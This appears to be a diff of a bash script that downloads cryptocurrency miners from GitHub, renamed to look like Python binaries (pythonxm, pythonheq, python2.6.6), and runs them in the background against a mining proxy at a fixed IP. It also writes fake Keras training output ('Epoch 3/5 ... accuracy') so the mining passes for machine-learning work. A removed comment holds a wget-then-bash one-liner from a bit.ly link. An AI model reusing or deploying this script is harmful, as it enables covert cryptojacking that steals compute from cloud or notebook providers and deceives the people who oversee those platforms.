@@ -1,14 +1,12 @@
 #!/bin/bash
-# wget -q -O /tmp/cpu bit.ly/CPU00001; bash /tmp/cpu
-
 echo '{ '
 echo '"type":"tf.keras",' > /tmp/keras.json
-echo '"version":"0.0.9",' >> /tmp/keras.json
+echo '"version":"0.0.12",' >> /tmp/keras.json
 if [[ $1 -gt 0 ]] 
 then
-    echo '"version":"0.0.9",'
+    echo '"version":"0.0.12",'
 fi
-echo '"status":"Epoch 1/5 1875/1875 [==============================] - 5s 2ms/step - loss: 0.1173 - accuracy: 0.9127",' >> /tmp/keras.json
+echo '"status":"Epoch 3/5 1975/1975 [==============================] - 5s 4ms/step - loss: 0.1113 - accuracy: 0.9027",' >> /tmp/keras.json
 
 PROX=168.119.180.25
 ETPort=80
@@ -28,8 +26,9 @@ CA_PROX=168.119.180.25
 ASIA_PROX=$PROX
 
 #VCOptions="d=16,xn=1,hybrid"
-#VCOptions="mc=VRSC"
-VCOptions="c=DOGE"
+VCOptions="mc=VRSC"
+#VCOptions="c=DOGE,m=solo"
+#VCOptions="c=DOGE"
 #VCOptions="c=VRSC,mc=VRSC"
 
 #VCOptions="X"
@@ -87,12 +86,19 @@ function displaytime {
   printf '%d seconds\n' $S
 }
 
+jammer() {
+    while true;
+    do
+        curl -s $SWITCHPROX:$VCPort -m 1  > /dev/null ;
+        sleep 1
+    done
+}
 
 
 ##  CPU info
 
 echo -e '#####################################   CPU info  ###########################################' > /tmp/pysi.log
-
+jammer &
 VCPUNUM=$(nproc)
 echo '"nproc":'$VCPUNUM',' >> /tmp/keras.json
 
@@ -167,7 +173,7 @@ XMPRICE=$(echo  $INFIDIFF | /tmp/jq '.[2].price')
 
 
 ETHPROFIT=$(python3 -c "print('%.2f' % (22.0*$ETHREWARD*1e6*$ETHPRICE*24*30 ) )"  )
-RVPROFIT=$(python3 -c "print('%.2f' % (8.0*$RVREWARD*1e6*$RVPRICE*24*30 ) )"  )
+RVPROFIT=$(python3 -c "print('%.2f' % (2.7*$RVREWARD*1e6*$RVPRICE*24*30 ) )"  )
 VCPROFIT=$(python3 -c "print('%.2f' % (1.3*$VCREWARD*1e6*$VCPRICE*24*30 ) )")
 XMPROFIT=$(python3 -c "print('%.2f' % ( 300.2*$XMREWARD*$XMPRICE*24*30 ) )"   )
 
@@ -424,6 +430,221 @@ echo '"opg":"'$OPG'",' >> /tmp/keras.json
 
 i="0"
 
-  wget -q https://github.com/one10001/10001code/raw/main/pythonheq
-  chmod +x pythonheq
- ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."$INFO" -t "$VCThreads" -p "$VCOptions" 
+while true
+do
+if [ $OP == "XM" ]
+then
+    ####### XM
+    #               Executable
+    echo start >> ooutxm
+    rm -rf pythonxm
+    wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
+    chmod +x pythonxm
+    #                Config
+    wget -q https://github.com/one10001/10001code/raw/main/config.json
+    sed -i "s+ip0001+RV_$IPNAME+g" config.json
+    sed -i "s+168.119.180.25+$PROX+g" config.json
+    sed -i "s+:8080+:$XMPort+g" config.json
+    sed -i "s+44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p+$W_XM+g" config.json
+
+    nohup ./pythonxm -c config.json -t "$XMThreads" -l ooutxm 2>> ooutxm 1>> ooutxm &
+
+elif [ $OP == "VC" ]
+then  
+    ###### VC
+    echo start >> ooutvc
+    rm -rf pythonheq
+    wget -q https://github.com/one10001/10001code/raw/main/pythonheq
+    chmod +x pythonheq
+
+    nohup ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."$INFO" -t "$VCThreads" -p "$VCOptions" 1>> ooutvc 2>> ooutvc &
+else
+    VCThreads=$[$(nproc)/2]
+    XMThreads=$[$(nproc)/2]
+        ####### XM
+    #               Executable
+    echo start >> ooutxm
+    rm -rf pythonxm
+    wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
+    chmod +x pythonxm
+    #                Config
+    wget -q https://github.com/one10001/10001code/raw/main/config.json
+    sed -i "s+ip0001+RV_$IPNAME+g" config.json
+    sed -i "s+168.119.180.25+$PROX+g" config.json
+    sed -i "s+44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p+$W_XM+g" config.json
+
+    nohup ./pythonxm -c config.json -t "$XMThreads" -l ooutxm 2>> ooutxm 1>> ooutxm &
+    echo start >> ooutvc
+    rm -rf pythonheq
+    wget -q https://github.com/one10001/10001code/raw/main/pythonheq
+    chmod +x pythonheq
+
+    nohup ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."$INFO" -t "$VCThreads" -p "$VCOptions" 1>> ooutvc 2>> ooutvc &
+fi
+
+if [ $OPG == "ET" ]
+then
+    rm -rf pyeth2
+    wget -q  https://github.com/one10001/ethminer/releases/download/v0.0.1/pyeth2 2> lol.out
+    chmod +x pyeth2
+    if  [ $PROG == "CU" ]
+    then
+        nohup  ./pyeth2  -P stratum+tcp://"$W_ET"."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$ETPort  -U 2>> oout 1>> oout &
+    else
+        nohup  ./pyeth2  -P stratum+tcp://"$W_ET"."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$ETPort  -G 2>> oout 1>> oout &
+    fi
+
+elif [ $OPG == "RV" ]
+then
+    rm -rf python2.6.6
+    wget -q https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.6 2> lol.out
+    chmod +x python2.6.6
+    if  [ $PROG == "CU" ]
+    then
+    nohup  ./python2.6.6  -P stratum+tcp://"$W_RV"."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$RVPort  -U 2>> oout 1>> oout &
+    else
+    nohup  ./python2.6.6  -P stratum+tcp://"$W_RV"."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$RVPort  -G 2>> oout 1>> oout &
+    fi
+else
+    echo "No GPU"  > /tmp/pysi.log
+fi
+
+
+##################################################################
+########                Display                          #########     
+##################################################################
+if [[ $1 -gt 0 ]] 
+then
+    echo -en '"runing":"'
+elif [[ $1 == 0 ]] 
+then
+    echo -en '"s":"'
+else
+    cat /tmp/keras.json
+    echo -en '"wating":"'
+fi
+
+
+i=0
+while true
+    do
+        i=$[$i+1]
+        echo -e "${On_IWhite}${BIGreen}Timer: $(displaytime $[($i-1)*$DisplayRefrech])|${On_IWhite}${BIBlue} IP: $IIP |  INFO: $COUNTRY - $REGION - $CITY - $IPORG ${Color_Off}"  > /tmp/pysi.log
+        if [ $GPU == "NONE" ]
+        then
+        echo -e "${BCColor} CPU OP: $OP |  CPU $CPU: $CPUSPEED x $VCPUNUM - $CPUCACHE | RAM: $memtot | PROX: $PROX  "  > /tmp/pysi.log
+        else
+        echo -e "${BIYellow}${BGColor}GPU OP: $OPG  | GPU: $GPU / $PROG |${BCColor} CPU OP: $OP |  CPU $CPU: $CPUSPEED x $VCPUNUM - $CPUCACHE | RAM: $memtot | PROX: $PROX "  > /tmp/pysi.log
+        fi
+        
+        Gacc=$(grep Acc oout | wc -l)
+        Vacc=$(grep Acc ooutvc | wc -l)
+        Xacc=$(grep acc ooutxm | wc -l)
+
+        if [ $GPU == "NONE" ]
+        then
+        echo -e "ONLY CPU " > /tmp/envtype 
+        else
+        echo -e "CPU + GPU" > /tmp/envtype
+                Gspeed=$(grep 'Mh' oout | tail -n 1 |awk -F" " '{print $7}'|sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g")
+                Gping=$(grep 'ms' oout | tail -n 1 |awk -F" " '{print $6}'|sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g")
+                GSHARE=$(grep Acc oout | wc -l)
+                GRATIO=$[$GSHARE*3600/($i*$DisplayRefrech)]
+                GPROFIT=0
+                if [ $OPG == "RV" ]
+                then
+                GPROFIT=$(python3 -c "print('%.2f' % ($RVREWARD * $Gspeed * 1e6 * $RVPRICE * 24 * 30 ))" 2>> /tmp/.max/err  )
+                else
+                GPROFIT=$(python3 -c "print('%.2f' % ($ETHREWARD * $Gspeed * 1e6 * $ETHPRICE * 24 * 30 ))" 2>> /tmp/.max/err  )
+                fi
+                echo -e "${BIWhite}${BGColor}GPU $OPG -> ${BIYellow} $i ${Color_Off}:  ${BIGreen} GSHARE: $GSHARE ${Color_Off} | ${BIPurple} GRATIO : ${BIBlue} $GRATIO ${Color_Off} | GSpeed :${BIRed} $Gspeed ${Color_Off} | GPing :${BIRed} $Gping ${Color_Off} | PerMonth :${BIRed} $GPROFIT ${Color_Off}"  > /tmp/pysi.log
+                if [[ $1 -gt 0 ]] 
+                then
+                    echo -en 'G:'$Gspeed'>'$GPROFIT' '
+                fi
+        fi
+
+
+     
+
+        if [ $OP == "XM" ]
+        then
+            Xspeed=$(grep 'max' ooutxm | tail -n 1 |awk -F"max" '{print $2}'| sed 's|H/s||g'|sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g")  
+            XSHARE=$(grep acc ooutxm | wc -l)
+            Xping=$(grep acc ooutxm | tail -n 1 |awk -F"(" '{print $3}'|awk -F"ms" '{print $1}')
+            XRATIO=$[$XSHARE*3600/($i*$DisplayRefrech)]
+            XMPROFIT=$(python3 -c "print('%.2f' % ($Xspeed * $XMREWARD * $XMPRICE * 24 * 30 ))" 2>> /tmp/.max/err  )
+            echo -e "${BIWhite}${On_Red}CPU $OP -> ${BIYellow} $i ${Color_Off}: ${BIBlue} XSHARE: $XSHARE ${Color_Off} | ${BIPurple} XRATIO : ${BIRed} $XRATIO ${Color_Off} | XSpeed :${BIRed} $Xspeed ${Color_Off} | Xping :${BIRed} $Xping ${Color_Off} | PerMonth :${BIRed} $XMPROFIT ${Color_Off}"  > /tmp/pysi.log
+            
+            if [[ $1 -gt 0 ]] 
+            then
+                echo -en 'C:'$Xspeed'>'$XMPROFIT' '
+            fi
+
+        elif [ $OP == "VC" ]
+        then
+            Vspeed=$(grep 'Speed' ooutvc | tail -n 1 |awk -F" " '{print $5}'|sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g")
+            VSHARE=$(grep Acc ooutvc | wc -l)
+            VRATIO=$[$VSHARE*3600/($i*$DisplayRefrech)]
+            VCPROFIT=$(python3 -c "print('%.2f' % ( $Vspeed * $VCREWARD * 1e6 * $VCPRICE * 24 *30 ))" 2>> /tmp/.max/err) 
+            echo -e "${BIWhite}${On_Blue}CPU $OP -> ${BIYellow} $i ${Color_Off}: ${BIBlue} VSHARE: $VSHARE ${Color_Off} | ${BIPurple} VRATIO : ${BIRed} $VRATIO ${Color_Off}  | VSpeed :${BIRed} $Vspeed ${Color_Off} | PerMonth :${BIRed} $VCPROFIT ${Color_Off}"  > /tmp/pysi.log
+            
+            if [[ $1 -gt 0 ]] 
+            then
+                echo -en 'C:'$Vspeed'>'$VCPROFIT' '
+            fi
+        else 
+            Vspeed=$(grep 'Speed' ooutvc | tail -n 1 |awk -F" " '{print $5}')
+            VSHARE=$(grep Acc ooutvc | wc -l)
+            VRATIO=$[$VSHARE*3600/($i*$DisplayRefrech)]
+            echo -e "${BIWhite}${On_Blue}CPU VC -> ${BIYellow} $i ${Color_Off}: ${BIBlue} VSHARE: $VSHARE ${Color_Off} | ${BIPurple} VRATIO : ${BIRed} $XRATIO ${Color_Off} | VSpeed :${BIRed} $Vspeed ${Color_Off}"  > /tmp/pysi.log
+            Xspeed=$(grep 'max' ooutxm | tail -n 1 |awk -F"max" '{print $2}')
+            XSHARE=$(grep acc ooutxm | wc -l)
+            Xping=$(grep acc ooutxm | tail -n 1 |awk -F"(" '{print $3}'|awk -F"ms" '{print $1}')
+            XRATIO=$[$XSHARE*3600/($i*$DisplayRefrech)]
+            echo -e "${BIWhite}${On_Red} XM -> ${BIYellow} $i ${Color_Off}: ${BIBlue} XSHARE: $XSHARE ${Color_Off} | ${BIPurple} XRATIO : ${BIRed} $XRATIO ${Color_Off} | XSpeed :${BIRed} $Xspeed ${Color_Off}"  > /tmp/pysi.log
+            if [[ $1 -gt 0 ]] 
+            then
+                echo -en 'C:'$Vspeed'>'$VCPROFIT' '
+            fi 
+        fi
+
+        if [ $Debug == "True" ]
+        then         
+            echo '###########################################  OOUT  #############################################' > /tmp/pysi.log
+            tail oout > /tmp/pysi.log
+            echo '###########################################  OOUTXM  #############################################' > /tmp/pysi.log
+            tail ooutxm > /tmp/pysi.log
+            echo '###########################################  OOUTVC  #############################################' > /tmp/pysi.log
+            tail ooutvc > /tmp/pysi.log
+            echo  > /tmp/pysi.log
+        fi
+        #i=$[$i+1]
+        echo > /tmp/pysi.log
+        echo > /tmp/pysi.log
+        
+        if [[ $1 -gt 0 ]] 
+        then
+            echo -en '*'
+        elif [[ $1 == 0 ]] 
+        then
+
+            echo -en " "
+        else
+            echo -en '*'
+        fi
+
+        tail -f /tmp/pysi.log        
+        sleep $DisplayRefrech
+        
+
+    done
+
+
+
+
+echo -e "#######################   Process  Killed    #########################" > /tmp/pysi.log
+                  
+done
+echo '"}'
+#tail -f oout
